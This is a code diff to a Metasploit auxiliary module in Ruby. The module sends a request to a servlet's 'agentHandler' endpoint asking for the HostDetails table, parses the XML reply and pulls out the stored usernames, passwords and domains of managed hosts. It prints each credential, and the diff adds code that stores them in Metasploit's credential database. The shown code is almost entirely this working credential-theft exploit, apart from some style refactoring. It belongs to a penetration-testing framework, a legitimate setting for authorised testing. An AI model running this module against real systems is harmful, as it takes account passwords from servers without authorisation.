@@ -62,13 +62,13 @@ class Metasploit3 < Msf::Auxiliary
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, "agentHandler"),
       'method' =>'GET',
-        'vars_get' => {
-          'mode' => 'getTableData',
-          'table' => 'HostDetails'
-        }
+      'vars_get' => {
+        'mode' => 'getTableData',
+        'table' => 'HostDetails'
+      }
     })
 
-    if res and res.code == 200
+    if res && res.code == 200
       # When passwords have digits the XML parsing will fail.
       # Replace with an empty password attribute so that we know the device has a password
       # and therefore we want to add it to our host list.
@@ -78,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
       rescue
         fail_with(Failure::Unknown, "#{peer} - Error parsing the XML, dumping output #{xml}")
       end
-      slid_host_ary = Array.new
+      slid_host_ary = []
       doc.elements.each('Details/HostDetails') do |ele|
         if ele.attributes["password"] != nil
           # If an element doesn't have a password, then we don't care about it.
@@ -111,7 +111,7 @@ class Metasploit3 < Msf::Auxiliary
           }
         })
 
-        if res and res.code == 200
+        if res && res.code == 200
           begin
             doc = REXML::Document.new(res.body)
           rescue
@@ -135,7 +135,6 @@ class Metasploit3 < Msf::Auxiliary
                 # With AS/400 we get some garbage in the domain name even though it doesn't exist
                 domain_name = ""
               end
-              cred_table << [host_ipaddress, type, subtype, domain_name, username, password]
 
               msg = "Got login to #{host_ipaddress} | running "
               msg << type << (subtype != "" ? " | #{subtype}" : "")
@@ -143,6 +142,26 @@ class Metasploit3 < Msf::Auxiliary
               msg << (domain_name != "" ? "#{domain_name}\\#{username}" : username)
               msg << " | password: #{password}"
               print_good(msg)
+
+              cred_table << [host_ipaddress, type, subtype, domain_name, username, password]
+
+              credential_core = report_credential_core({
+                 password: password,
+                 username: username,
+               })
+
+              begin
+                host_login_data = {
+                  address: host_ipaddress,
+                  service_name: type,
+                  workspace_id: myworkspace_id,
+                  protocol: 'tcp',
+                  port: 0,    # can be any port, so just set to 0 else the cred api screams
+                  core: credential_core,
+                  status: Metasploit::Model::Login::Status::UNTRIED
+                }
+                create_credential_login(host_login_data)
+              end
             end
           end
         else
@@ -167,5 +186,28 @@ class Metasploit3 < Msf::Auxiliary
     else
       print_error("#{peer} - Failed to reach agentHandler servlet")
     end
+  end
+
+
+  def report_credential_core(cred_opts={})
+    # Set up the has for our Origin service
+    origin_service_data = {
+      address: rhost,
+      port: rport,
+      service_name: (ssl ? 'https' : 'http'),
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: self.fullname,
+      private_type: :password,
+      private_data: cred_opts[:password],
+      username: cred_opts[:username]
+    }
+
+    credential_data.merge!(origin_service_data)
+    create_credential(credential_data)
   end
 end
